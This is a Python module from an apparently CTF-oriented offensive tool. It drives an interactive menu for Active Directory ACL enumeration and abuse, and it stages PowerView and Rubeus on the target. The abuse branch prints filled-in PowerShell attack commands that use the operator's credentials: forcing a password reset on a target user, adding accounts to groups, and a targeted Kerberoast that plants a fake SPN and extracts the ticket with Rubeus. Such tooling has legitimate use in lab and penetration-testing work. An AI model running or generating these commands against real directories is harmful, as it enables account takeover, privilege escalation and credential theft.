def run(data, cred, args):
    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    W = '\033[0m'
    password = cred.get("secret")
    domain = data.get("domain")
    user = cred.get("user")
   
    if getattr(
        args,
        "windows",
        False
    ):

        from core.paths import get_tools_dir
        from modules.upload.windows import stage_windows_files

        print(
            f"{B}[?]{W} Transfer PowerView?\n"
        )

        print(
            f"  {B}[1]{W} Yes"
        )

        print(
            f"  {B}[2]{W} No\n"
        )

        choice = input(
            f"{Y}Select> {W}"
        ).strip()

        if choice == "1":

            windows_tools = (
                get_tools_dir() /
                "windows"
            )

            PowerView = (
                windows_tools /
                "PowerView.ps1"
            )

            stage_windows_files([
                PowerView
            ])

        print(
            f"\n{B}┌── ACL ENUMERATION & ABUSE ────────┐{W}"
        )

        print(
            f"{B}│{W}  Select Category                  {B}│{W}"
        )

        print(
            f"{B}└───────────────────────────────────┘{W}\n"
        )

        print(
            f"  {B}[1]{W} Enumeration"
        )

        print(
            f"  {B}[2]{W} Abuse\n"
        )

        category = input(
            f"{Y}Select> {W}"
        ).strip()

        #
        # ENUMERATION
        #

        if category == "1":

            print(
                f"\n{B}┌── ACL ENUMERATION ────────────────┐{W}"
            )

            print(
                f"{B}│{W}  Select Method                    {B}│{W}"
            )

            print(
                f"{B}└───────────────────────────────────┘{W}\n"
            )

            print(
                f"  {B}[1]{W} User ACLs"
            )

            print(
                f"  {B}[2]{W} Group ACLs"
            )

            print(
                f"  {B}[3]{W} Interesting ACLs"
            )

            print(
                f"  {B}[4]{W} Group Nesting"
            )

            print(
                f"  {B}[5]{W} GUID Lookup"
            )

            print(
                f"  {B}[6]{W} Built-in PowerShell ACL Enum\n"
            )

            enum_choice = input(
                f"{Y}Select> {W}"
            ).strip()

            if enum_choice == "1":

                print(
                    f"\n{G}[+] {W}User ACL Enumeration\n"
                )
                print(f"{Y}Import-Module .\\PowerView.ps1{W}")
                print()
                print(
                    f"{Y}$sid = Convert-NameToSid {C}{user}{W}"
                )

                print()
                print(
                f"{W}# What does this user control?{W}"
                )
                print(
                    f"{Y}Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {{$_.SecurityIdentifier -eq $sid}}{W}"
                )
                print()

                print(
                f"{W}# Does this user control a specific object?{W}"
                )

                print(
                    f"{Y}Get-DomainObjectACL -Identity {C}<target>{Y} -ResolveGUIDs | ? {{$_.SecurityIdentifier -eq $sid}}{W}"
                )

                print()

            elif enum_choice == "2":

                print(
                    f"\n{G}[+] {W}Group ACL Enumeration\n"
                )
                print(f"{Y}Import-Module .\\PowerView.ps1{W}")
                print()

                print(
                    f"{Y}$sid = Convert-NameToSid \"{C}<group>{Y}\"{W}"
                )

                print()
                print(
                f"{W}# What does this group control?{W}"
                )
                print(
                    f"{Y}Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {{$_.SecurityIdentifier -eq $sid}}{W}"
                )
                print()
                print(
                f"{W}# Does this group control a specific object?{W}"
               )
                print(
                    f"{Y}Get-DomainObjectACL -Identity {C}<target>{Y} -ResolveGUIDs | ? {{$_.SecurityIdentifier -eq $sid}}{W}"
                )

                print()

            elif enum_choice == "3":

                print(
                    f"\n{G}[+] {W}Interesting ACL Discovery\n"
                )
                print(f"{Y}Import-Module .\\PowerView.ps1{W}")
                print()

                print(
                    f"{Y}Find-InterestingDomainAcl{W}"
                )

                print()

            elif enum_choice == "4":

                print(
                    f"\n{G}[+] {W}Group Nesting\n"
                )
                print(f"{Y}Import-Module .\\PowerView.ps1{W}")
                print()
                print(
                    f"{Y}Get-DomainGroup -Identity \"{C}<group>{Y}\" | select memberof{W}"
                )

                print()

            elif enum_choice == "5":

                print(
                    f"\n{G}[+] {W}GUID Lookup\n"
                )

                print(
                    f"{Y}$guid = \"{C}<guid>{Y}\"{W}"
                )

                print()

                print(
                    f"{Y}Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {{ObjectClass -like 'ControlAccessRight'}} -Properties * | Select Name,DisplayName,DistinguishedName,rightsGuid | ? {{$_.rightsGuid -eq $guid}} | fl{W}"
                )

                print()

            elif enum_choice == "6":

                print(
                    f"\n{G}[+] {W}Built-in PowerShell ACL Enumeration\n"
                )

                print(
                    f"{Y}Import-Module ActiveDirectory{W}"
                )

                print()

                print(
                    f"{Y}Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt{W}"
                )

                print()

                print(
                    f"{W}# Find rights held by a specific user{W}"
                )

                print(
                    f"{Y}foreach($line in [System.IO.File]::ReadLines(\"ad_users.txt\")) {{ get-acl \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {{$_.IdentityReference -match '{C}{domain}\\\\{user}{Y}'}} }}{W}"
                )

                print()

                







        #
        # ABUSE
        #

        elif category == "2":

            print(
                f"\n{B}┌── ACL ABUSE ──────────────────────┐{W}"
            )

            print(
                f"{B}│{W}  Select Technique                 {B}│{W}"
            )

            print(
                f"{B}└───────────────────────────────────┘{W}\n"
            )
           
            print(
                f"  {B}[1]{W} Force Change Password"
            )

            print(
                f"  {B}[2]{W} Add User To Group"
            )

            print(
                f"  {B}[3]{W} Targeted Kerberoast"
            )

            print(
                f"  {B}[4]{W} GenericWrite"
            )

            print(
                f"  {B}[5]{W} GenericAll"
            )

            print(
                f"  {B}[6]{W} DCSync Rights\n"
            )
                    
            abuse_choice = input(
                f"{Y}Select> {W}"
            ).strip()

            if abuse_choice == "1":
                target = input(
                    f"{Y}Target User> {W}"
                ).strip()
                print(
                    f"\n{G}[+] {W}Force Change Password\n"
                )

                print(
                    f"{Y}Import-Module .\\PowerView.ps1{W}"
                )

                print()

                print(
                    f"{Y}$SecPassword = ConvertTo-SecureString '{C}{password}{Y}' -AsPlainText -Force{W}"
                )

                print(
                    f"{Y}$Cred = New-Object System.Management.Automation.PSCredential('{C}{domain}\\{user}{Y}', $SecPassword){W}"
                )

                print()

                print(
                    f"{Y}$NewPassword = ConvertTo-SecureString '{C}NewPass123!{Y}' -AsPlainText -Force{W}"
                )

                print()

                print(
                    f"{Y}Set-DomainUserPassword -Identity {C}{target}{Y} -AccountPassword $NewPassword -Credential $Cred -Verbose{W}"
                )

                print()
                print("# Add new user-creds")
                print(f"{Y}ctf add-cred {target} NewPass123!")


            elif abuse_choice == "2":

                group = input(
                    f"{Y}Target Group> {W}"
                ).strip()

                target = input(
                    f"{Y}User To Add (blank = {user})> {W}"
                ).strip()

                if not target:
                    target = user

                print(
                    f"\n{G}[+] {W}Add User To Group\n"
                )

                print(
                    f"{Y}Import-Module .\\PowerView.ps1{W}"
                )

                print()

                print(
                    f"{Y}$SecPassword = ConvertTo-SecureString '{C}{password}{Y}' -AsPlainText -Force{W}"
                )

                print(
                    f"{Y}$Cred = New-Object System.Management.Automation.PSCredential('{C}{domain}\\{user}{Y}', $SecPassword){W}"
                )

                print()

                print(
                    f"{Y}Add-DomainGroupMember -Identity '{C}{group}{Y}' -Members '{C}{target}{Y}' -Credential $Cred -Verbose{W}"
                )

                print()

                print(
                    f"{Y}Get-DomainGroupMember -Identity '{C}{group}{Y}' | Select MemberName{W}"
                )

                print()


            elif abuse_choice == "3":

                print(
                    f"{B}[?]{W} Transfer Rubeus.exe?\n"
                )

                print(
                    f"  {B}[1]{W} Yes"
                )

                print(
                    f"  {B}[2]{W} No\n"
                )

                choice = input(
                    f"{Y}Select> {W}"
                ).strip()

                if choice == "1":

                    windows_tools = (
                        get_tools_dir() /
                        "windows"
                    )

                    Rubeus = (
                        windows_tools /
                        "Rubeus.exe"
                    )

                    stage_windows_files([
                        Rubeus
                    ])

                target = input(
                    f"{Y}Target User> {W}"
                ).strip()

                print(
                    f"\n{G}[+] {W}Targeted Kerberoast\n"
                )

                print(
                    f"{Y}Import-Module .\\PowerView.ps1{W}"
                )

                print()

                print(
                    f"{Y}$SecPassword = ConvertTo-SecureString '{C}{password}{Y}' -AsPlainText -Force{W}"
                )

                print(
                    f"{Y}$Cred = New-Object System.Management.Automation.PSCredential('{C}{domain}\\{user}{Y}', $SecPassword){W}"
                )

                print()

                print(
                    f"{Y}Set-DomainObject -Credential $Cred -Identity {C}{target}{Y} -SET @{{serviceprincipalname='notahacker/LEGIT'}} -Verbose{W}"
                )

                print()

                print(
                    f"{G}[+] {W}Rubeus\n"
                )

                print(
                    f"{Y}Rubeus.exe kerberoast /user:{C}{target}{Y} /nowrap{W}"
                )

                print()


                print()   

            elif abuse_choice == "4":

                print(
                    f"\n{G}[+] {W}GenericWrite\n"
                )

                print(
                    f"{Y}[*]{W} Common abuses:"
                )

                print(
                    f"  {B}├──{W} Add user to group"
                )

                print(
                    f"  {B}├──{W} Modify attributes"
                )

                print(
                    f"  {B}└──{W} Targeted Kerberoast"
                )

                print()

            elif abuse_choice == "5":

                print(
                    f"\n{G}[+] {W}GenericAll\n"
                )

                print(
                    f"{Y}[*]{W} Common abuses:"
                )

                print(
                    f"  {B}├──{W} Password reset"
                )

                print(
                    f"  {B}├──{W} Group membership modification"
                )

                print(
                    f"  {B}└──{W} Targeted Kerberoast"
                )

                print()    

            elif abuse_choice == "6":

                print(
                    f"\n{G}[+] {W}DCSync Rights\n"
                )

                print(
                    f"{Y}[*]{W} DCSync commands are covered in the DCSync section."
                )

                print()        
    return data
